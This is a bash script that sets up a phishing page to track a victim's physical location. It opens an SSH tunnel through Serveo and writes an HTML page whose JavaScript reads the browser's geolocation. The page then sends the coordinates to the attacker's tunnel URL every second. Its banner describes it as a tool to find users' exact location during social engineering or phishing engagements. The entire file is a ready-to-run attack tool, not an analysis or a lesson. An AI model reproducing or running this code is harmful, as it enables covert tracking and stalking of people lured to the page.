#!/bin/bash

# Clear screen and print message
clear
echo "Copy the Serveo link (you have 20 seconds)..."
echo "-------------------------------------------"

# Start SSH tunnel to Serveo and log output
ssh -R 80:localhost:8080 serveo.net | tee ~/gps.log &
SSH_PID=$!

# Wait for link to appear
sleep 20
clear

# Display banner
cat << "EOF"

██╗    ███████╗███████╗███████╗    ██╗   ██╗ ██████╗ ██╗   ██╗
██║    ██╔════╝██╔════╝██╔════╝    ╚██╗ ██╔╝██╔═══██╗██║   ██║
██║    ███████╗█████╗  █████╗       ╚████╔╝ ██║   ██║██║   ██║
██║    ╚════██║██╔══╝  ██╔══╝        ╚██╔╝  ██║   ██║██║   ██║
██║    ███████║███████╗███████╗       ██║   ╚██████╔╝╚██████╔╝
╚═╝    ╚══════╝╚══════╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝

[+] Author: Viral Maniar  
[+] Modded by: Techguy origin (on TikTok)  
[+] Description: This tool uses Serveo to find the exact location of the user during social engineering or phishing engagements.

EOF

read -rp 'Enter the URL generated by Serveo (e.g., https://example.serveo.net): ' varurl

# Check if URL is entered
if [[ -z "$varurl" ]]; then
    echo "Error: No URL provided. Exiting."
    kill "$SSH_PID" 2>/dev/null
    exit 1
fi

# Setup the phishing page
mkdir -p ~/webpage
cat <<EOF > ~/webpage/index.html
<!DOCTYPE html>
<html>
<head>
    <title>I See You!</title>
    <style>
        body {
            background-image: url("https://user-images.githubusercontent.com/3501170/55271108-d11b3180-52fb-11e9-97e2-c930be295147.png");
            background-size: cover;
            background-repeat: no-repeat;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        function httpGet(theUrl) {
            fetch(theUrl, { mode: 'no-cors' })
                .catch(err => console.log("Error sending location:", err));
        }

        function autoUpdate() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const coords = \`\${position.coords.latitude},\${position.coords.longitude}\`;
                        const url = \`${varurl}/logme/\${coords}\`;
                        httpGet(url);
                        setTimeout(autoUpdate, 1000);
                    },
                    (err) => console.log("Geolocation error:", err)
                );
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        \$(document).ready(autoUpdate);
    </script>
</body>
</html>
EOF

# Start a local server
cd ~/webpage || exit 1

if command -v python3 &>/dev/null; then
    python3 -m http.server 8080 &>/dev/null &
    SERVER_PID=$!
    echo "[✓] Server started using Python at http://localhost:8080"
elif command -v busybox &>/dev/null; then
    busybox httpd -f -p 8080 &
    SERVER_PID=$!
    echo "[✓] Server started using BusyBox at http://localhost:8080"
elif command -v ncat &>/dev/null; then
    while true; do
        { echo -ne "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"; cat index.html; } | ncat -l 8080
    done &
    SERVER_PID=$!
    echo "[✓] Server started using ncat at http://localhost:8080"
else
    echo "[✗] No supported server found (Python, BusyBox, or ncat)"
    kill "$SSH_PID" 2>/dev/null
    exit 1
fi

# Clean up when exiting
trap 'kill $SSH_PID $SERVER_PID 2>/dev/null; echo -e "\n[+] Cleaned up background processes."' EXIT

echo "-------------------------------------------"
echo "[✓] Tunnel active via Serveo: $varurl"
echo "[✓] Web server running on http://localhost:8080"
echo "[*] Press Ctrl+C to stop..."
wait
